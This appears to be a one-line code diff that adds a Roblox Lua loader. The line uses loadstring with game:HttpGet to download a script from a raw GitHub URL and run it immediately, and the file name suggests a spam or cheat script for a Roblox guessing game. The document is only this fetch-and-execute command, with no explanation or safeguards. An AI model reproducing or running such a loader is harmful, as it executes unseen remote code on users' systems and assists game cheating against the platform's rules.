@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/2-player-guess-the-anime-character-spam2-sg3i5xt0jrt2f4.lua"))()
